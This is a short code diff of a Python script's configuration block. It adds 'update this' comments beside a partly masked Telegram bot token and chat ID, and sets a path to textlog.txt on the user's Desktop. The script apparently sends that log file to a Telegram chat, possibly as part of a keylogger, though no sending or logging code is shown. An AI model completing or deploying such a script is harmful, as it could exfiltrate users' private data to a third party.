@@ -7,8 +7,8 @@ import os
 # -------------------
 # CONFIGURATION
 # -------------------
-BOT_TOKEN = "8590574092:AAFFLpP8Seh5OBsPOtxxxxxxxxrfC6cf2-g"
-CHAT_ID = "62xxxx9131"
+BOT_TOKEN = "8590574092:AAFFLpP8Seh5OBsPOtxxxxxxxxrfC6cf2-g" #update this with your bot_token
+CHAT_ID = "62xxxx9131"                                       #update thsi with your chat_id
 
 # Automatically detect Desktop path and point to textlog.txt
 FILE_PATH = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'textlog.txt')
